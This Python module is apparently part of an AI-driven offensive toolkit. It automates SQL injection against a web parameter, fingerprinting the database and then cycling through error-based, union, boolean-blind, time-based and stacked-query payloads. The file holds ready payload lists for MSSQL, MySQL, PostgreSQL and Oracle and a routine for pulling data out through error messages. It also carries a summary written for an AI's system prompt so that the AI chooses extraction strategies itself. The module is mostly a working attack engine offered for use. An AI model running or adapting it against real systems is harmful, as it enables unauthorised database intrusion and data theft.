"""
SQLi Auto-Stage Engine — 에러→유니온→불린→타임 자동 전환
==========================================================
AI가 응답을 보고 가장 효과적인 SQLi 기법을 자동 선택한다.

자동 전환 순서:
  [1] Error-Based   → SQL 에러 메시지 직접 노출 시
  [2] Union-Based   → 컬럼 수 일치 + 값 반영 시
  [3] Boolean-Blind → 응답 크기/내용 차이 탐지 시
  [4] Time-Based    → SLEEP/WAITFOR 딜레이 확인 시
  [5] Stacked       → ADODB 800a0cc1 등 세미콜론 허용 시
  [6] OOB           → Out-of-Band DNS 채널 (마지막 수단)

DB별 전용 페이로드:
  MSSQL  → CONVERT, CAST, WAITFOR DELAY, xp_cmdshell
  MySQL  → EXTRACTVALUE, SLEEP, INTO OUTFILE
  PostgreSQL → pg_sleep, COPY TO
  Oracle → XMLTYPE, DBMS_PIPE
"""
from __future__ import annotations

import re
import time
import random
from dataclasses import dataclass, field
from typing import Callable

from .http_probe import HttpProbe, ProbeResult


# ══════════════════════════════════════════════════════════════
# DB 타입 감지
# ══════════════════════════════════════════════════════════════

DB_FINGERPRINTS = {
    "mssql": [
        r"microsoft.*ole db.*sql server",
        r"unclosed quotation mark",
        r"incorrect syntax near",
        r"80040e14",
        r"80040e07",
        r"80040e21",
        r"sql server.*native client",
        r"mssql_query",
        r"adodb\.command",
        r"adodb\.connection",
        r"800a0cc1",     # stacked query indicator
        r"waitfor delay",
        r"MSSQL",
    ],
    "mysql": [
        r"you have an error in your sql syntax",
        r"mysql_fetch_array",
        r"mysql_num_rows",
        r"mysql.*error",
        r"1064.*sql syntax",
        r"table.*doesn.t exist",
        r"unknown column",
        r"extractvalue\(",
        r"updatexml\(",
    ],
    "postgresql": [
        r"pg_query",
        r"pg_exec",
        r"postgreSQL.*ERROR",
        r"unterminated quoted string",
        r"pg_sleep",
        r"PostgreSQL",
    ],
    "oracle": [
        r"ORA-\d{5}",
        r"oracle.*error",
        r"quoted string not properly terminated",
        r"xmltype\(",
        r"dbms_pipe",
    ],
    "sqlite": [
        r"sqlite_.*error",
        r"sqlite3\.",
        r"SQLite",
    ],
}


@dataclass
class DbFingerprint:
    db_type: str        # mssql / mysql / postgresql / oracle / sqlite / unknown
    confidence: str     # high / medium / low
    evidence: str
    supports_stacked: bool = False


def detect_db_type(body: str, headers: dict | None = None) -> DbFingerprint:
    """응답 본문에서 DB 타입 자동 감지"""
    body_lower = body.lower()
    for db_type, patterns in DB_FINGERPRINTS.items():
        for pat in patterns:
            if re.search(pat, body_lower, re.I):
                supports_stacked = db_type in ("mssql", "postgresql")
                return DbFingerprint(
                    db_type=db_type,
                    confidence="high",
                    evidence=f"Pattern match: {pat}",
                    supports_stacked=supports_stacked,
                )
    return DbFingerprint(db_type="unknown", confidence="low",
                         evidence="No DB fingerprint found", supports_stacked=False)


# ══════════════════════════════════════════════════════════════
# DB별 에러 기반 페이로드
# ══════════════════════════════════════════════════════════════

ERROR_PAYLOADS: dict[str, list[str]] = {
    "mssql": [
        "' CONVERT(int,@@version)--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--",
        "' AND 1=CONVERT(int,SYSTEM_USER)--",
        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; DECLARE @x varchar(100); SET @x=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55); "
        "EXEC('SELECT '''+@x+''' FROM sysobjects WHERE 1=2')--",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) "
        "FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),"
        "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM (SELECT database()) x))--",
    ],
    "postgresql": [
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1=CAST((SELECT current_database()) AS int)--",
        "' AND 1=CAST((SELECT current_user) AS int)--",
        "'; SELECT 1/0--",  # zero-division error
    ],
    "oracle": [
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,NULL,XMLTYPE('<x>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</x>') FROM DUAL--",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    ],
    "generic": [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(3)--",
        "'; WAITFOR DELAY '0:0:3'--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
    ],
}

# ══════════════════════════════════════════════════════════════
# DB별 유니온 페이로드 (컬럼 수 자동 탐색 포함)
# ══════════════════════════════════════════════════════════════

def build_union_payload(db_type: str, col_count: int, inject_col: int = 1) -> str:
    """
    col_count 컬럼 수에 맞는 UNION SELECT 페이로드 생성
    inject_col: 데이터 추출에 사용할 컬럼 인덱스 (1-based)
    """
    nulls = ["NULL"] * col_count
    if db_type == "mssql":
        nulls[inject_col - 1] = "CONVERT(varchar(255),@@version)"
    elif db_type == "mysql":
        nulls[inject_col - 1] = "VERSION()"
    elif db_type == "postgresql":
        nulls[inject_col - 1] = "current_setting('server_version')"
    elif db_type == "oracle":
        nulls[inject_col - 1] = "(SELECT banner FROM v$version WHERE ROWNUM=1)"
    else:
        nulls[inject_col - 1] = "1337"

    select_part = ",".join(nulls)
    if db_type == "oracle":
        return f"' UNION SELECT {select_part} FROM DUAL--"
    return f"' UNION SELECT {select_part}--"


# ══════════════════════════════════════════════════════════════
# DB별 타임 기반 페이로드
# ══════════════════════════════════════════════════════════════

TIME_PAYLOADS_BY_DB: dict[str, list[tuple[str, float]]] = {
    "mssql": [
        ("'; WAITFOR DELAY '0:0:5'--", 5.0),
        ("1; WAITFOR DELAY '0:0:5'--", 5.0),
        ("' AND 1=1; WAITFOR DELAY '0:0:5'--", 5.0),
    ],
    "mysql": [
        ("' AND SLEEP(5)--", 5.0),
        ("' AND SLEEP(5)#", 5.0),
        ("1 AND SLEEP(5)--", 5.0),
        ("' AND BENCHMARK(10000000,MD5(1))--", 4.0),
    ],
    "postgresql": [
        ("'; SELECT pg_sleep(5)--", 5.0),
        ("' AND 1=(SELECT 1 FROM pg_sleep(5))--", 5.0),
    ],
    "oracle": [
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5.0),
        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),5)--", 5.0),
    ],
    "generic": [
        ("' AND SLEEP(5)--", 5.0),
        ("'; WAITFOR DELAY '0:0:5'--", 5.0),
        ("1 AND SLEEP(5)--", 5.0),
    ],
}


# ══════════════════════════════════════════════════════════════
# SQLi 단계 자동 전환 엔진
# ══════════════════════════════════════════════════════════════

@dataclass
class SqliStageResult:
    stage: str               # error / union / boolean / time / stacked / none
    db_type: str
    payload_used: str
    evidence: str
    col_count: int = 0       # union-based 시 컬럼 수
    data_extracted: str = ""
    is_confirmed: bool = False


class SqliAutoEngine:
    """
    WAF 우회 후 SQLi 기법 자동 선택 엔진.
    AI가 이 엔진의 결과를 보고 다음 추출 전략을 결정한다.
    """

    SQL_ERROR_PATTERNS = [
        r"you have an error in your sql syntax",
        r"ORA-\d{5}",
        r"pg_query",
        r"sqlite_.*error",
        r"mssql_query",
        r"microsoft.*ole db.*sql",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"1064.*sql syntax",
        r"table.*doesn.t exist",
        r"unknown column",
        r"extractvalue\(",
        r"updatexml\(",
        r"column count doesn.t match",
        r"syntax error.*line",
        r"80040e14",
        r"80040e07",
        r"80040e21",
        r"adodb.*error",
        r"xpath syntax error",
    ]

    def __init__(self, probe: HttpProbe, on_progress: Callable[[str], None] | None = None):
        self.probe = probe
        self.log = on_progress or (lambda s: None)

    def auto_detect_stage(
        self,
        url: str,
        param: str,
        method: str = "GET",
        post_data: dict | None = None,
        db_hint: str = "generic",
    ) -> SqliStageResult:
        """
        URL + 파라미터에 대해 최적 SQLi 기법 자동 탐지.
        에러→유니온→불린→타임 순으로 시도.
        """
        # 기준선 응답
        base_r = self._send(url, "1", method, param, post_data)
        base_size = len(base_r.body)

        self.log(f"  [SQLi] 기준선: {base_size}B  DB힌트: {db_hint}")

        # ── STAGE 1: Error-Based ──────────────────────────────
        self.log("  [SQLi] 단계 1: Error-Based 시도...")
        payloads = ERROR_PAYLOADS.get(db_hint, []) + ERROR_PAYLOADS["generic"]
        for pl in payloads[:6]:
            r = self._send(url, pl, method, param, post_data)
            fp = detect_db_type(r.body)
            if fp.db_type != "unknown":
                db_type = fp.db_type
            else:
                db_type = db_hint

            # SQL 에러 패턴 탐지
            for pat in self.SQL_ERROR_PATTERNS:
                if re.search(pat, r.body, re.I):
                    self.log(f"  [SQLi✓] Error-Based 확인: {pat[:30]}")
                    return SqliStageResult(
                        stage="error",
                        db_type=db_type,
                        payload_used=pl,
                        evidence=f"Error pattern: {pat[:50]}",
                        data_extracted=r.body[:300],
                        is_confirmed=True,
                    )
            time.sleep(0.3)

        # ── STAGE 2: Union-Based (컬럼 수 자동 탐색) ─────────
        self.log("  [SQLi] 단계 2: Union-Based 시도 (컬럼 수 1~15)...")
        for col_n in range(1, 16):
            pl = build_union_payload(db_hint, col_n)
            r = self._send(url, pl, method, param, post_data)
            # 컬럼 불일치 에러 없으면 성공 가능
            if r.status == 200 and "column count" not in r.body.lower():
                # 실제 데이터 반영 여부 확인 (버전/DB명)
                if re.search(r"\d+\.\d+\.\d+|MySQL|PostgreSQL|Microsoft SQL", r.body, re.I):
                    self.log(f"  [SQLi✓] Union-Based 확인: {col_n}컬럼")
                    return SqliStageResult(
                        stage="union",
                        db_type=db_hint,
                        payload_used=pl,
                        evidence=f"Union {col_n} columns — DB version reflected",
                        col_count=col_n,
                        data_extracted=r.body[:300],
                        is_confirmed=True,
                    )
            time.sleep(0.2)

        # ── STAGE 3: Boolean-Blind ────────────────────────────
        self.log("  [SQLi] 단계 3: Boolean-Blind 교정...")
        true_r = self._send(url, "1' AND '1'='1", method, param, post_data)
        false_r = self._send(url, "1' AND '1'='2", method, param, post_data)
        true_size = len(true_r.body)
        false_size = len(false_r.body)

        diff = abs(true_size - false_size)
        if diff > 100:
            self.log(f"  [SQLi✓] Boolean-Blind 확인: TRUE={true_size}B FALSE={false_size}B 차={diff}B")
            return SqliStageResult(
                stage="boolean",
                db_type=db_hint,
                payload_used="1' AND '1'='1  vs  1' AND '1'='2",
                evidence=f"Size diff {diff}B (T={true_size} F={false_size})",
                is_confirmed=True,
            )

        # ── STAGE 4: Time-Based ───────────────────────────────
        self.log("  [SQLi] 단계 4: Time-Based 시도...")
        time_pls = TIME_PAYLOADS_BY_DB.get(db_hint, TIME_PAYLOADS_BY_DB["generic"])
        for pl, expected_delay in time_pls[:3]:
            start = time.time()
            r = self._send(url, pl, method, param, post_data, timeout=expected_delay + 5)
            elapsed = time.time() - start
            threshold = expected_delay * 0.8
            if elapsed >= threshold:
                self.log(f"  [SQLi✓] Time-Based 확인: {elapsed:.1f}s ≥ {threshold:.1f}s")
                return SqliStageResult(
                    stage="time",
                    db_type=db_hint,
                    payload_used=pl,
                    evidence=f"Delay {elapsed:.2f}s >= {threshold:.2f}s",
                    is_confirmed=True,
                )
            time.sleep(0.5)

        # ── STAGE 5: Stacked Queries (MSSQL/PGSQL 전용) ──────
        if db_hint in ("mssql", "postgresql"):
            self.log("  [SQLi] 단계 5: Stacked Query 시도...")
            if db_hint == "mssql":
                pl = "'; WAITFOR DELAY '0:0:3'--"
            else:
                pl = "'; SELECT pg_sleep(3)--"
            start = time.time()
            r = self._send(url, pl, method, param, post_data, timeout=10)
            elapsed = time.time() - start
            if elapsed >= 2.4:
                self.log(f"  [SQLi✓] Stacked Query 확인: {elapsed:.1f}s")
                return SqliStageResult(
                    stage="stacked",
                    db_type=db_hint,
                    payload_used=pl,
                    evidence=f"Stacked delay {elapsed:.2f}s",
                    is_confirmed=True,
                )

        self.log("  [SQLi✗] 모든 단계 실패 — 이 파라미터 주입 불가")
        return SqliStageResult(
            stage="none",
            db_type=db_hint,
            payload_used="",
            evidence="All stages exhausted",
            is_confirmed=False,
        )

    def extract_value_error_based(
        self,
        url: str,
        param: str,
        query: str,
        db_type: str,
        method: str = "GET",
        post_data: dict | None = None,
    ) -> str:
        """
        에러 기반으로 단일 값 추출.
        query: 단일 값 반환 SQL (e.g. "SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55")
        """
        if db_type == "mssql":
            pl = f"' AND 1=CONVERT(int,({query}))--"
        elif db_type == "mysql":
            pl = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--"
        elif db_type == "postgresql":
            pl = f"' AND 1=CAST(({query}) AS int)--"
        elif db_type == "oracle":
            pl = (
                f"' AND 1=CTXSYS.DRITHSX.SN(1,({query}))--"
            )
        else:
            pl = f"' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--"

        r = self._send(url, pl, method, param, post_data)
        # 에러 메시지에서 값 추출
        m = re.search(r"~([^'\"<>\s]{1,200})", r.body)
        if m:
            return m.group(1)
        m = re.search(r"Conversion failed.*?'([^']+)'", r.body, re.I)
        if m:
            return m.group(1)
        m = re.search(r"XPATH syntax error.*?'([^']+)'", r.body, re.I)
        if m:
            return m.group(1)
        return ""

    def _send(self, url: str, payload: str, method: str, param: str,
              post_data: dict | None, timeout: float = 30) -> ProbeResult:
        import urllib.parse
        if method.upper() == "GET":
            import re as _re
            target_url = _re.sub(
                rf"({_re.escape(param)}=)[^&]*",
                lambda m: m.group(1) + urllib.parse.quote(payload, safe=""),
                url,
            )
            if param not in url:
                sep = "&" if "?" in url else "?"
                target_url = url + sep + f"{param}={urllib.parse.quote(payload, safe='')}"
            return self.probe.get(target_url, timeout=timeout)
        else:
            data = dict(post_data or {})
            data[param] = payload
            return self.probe.post(url, data, timeout=timeout)


# ══════════════════════════════════════════════════════════════
# 공개 API — 시스템 프롬프트용 요약
# ══════════════════════════════════════════════════════════════

SQLI_AUTO_STAGE_SUMMARY = """
=== SQLi AUTO-STAGE ENGINE (AI AUTO-SELECT) ===

Stage selection order (auto):
  [1] Error-Based  → detect SQL error in response → extract directly
  [2] Union-Based  → find column count 1~15 → extract via UNION SELECT
  [3] Boolean-Blind→ TRUE/FALSE size diff > 100B → binary char extraction
  [4] Time-Based   → SLEEP/WAITFOR ≥ 0.8× expected delay → bit extraction
  [5] Stacked      → MSSQL/PGSQL semicolon execution for side effects

DB-Specific payloads (auto-selected by fingerprint):
  MSSQL   → CONVERT(int, query) error  |  WAITFOR DELAY
  MySQL   → EXTRACTVALUE(1, CONCAT(~,)) | SLEEP()
  PostgreSQL → CAST(query AS int) error | pg_sleep()
  Oracle  → XMLTYPE / CTXSYS.DRITHSX  | DBMS_PIPE

from bingo.tools.sqli_auto import SqliAutoEngine, detect_db_type
engine = SqliAutoEngine(probe)
result = engine.auto_detect_stage(url, param, db_hint='mssql')
# result.stage → 'error' / 'union' / 'boolean' / 'time' / 'stacked'
# result.db_type → 'mssql' / 'mysql' / 'postgresql' / 'oracle'
"""
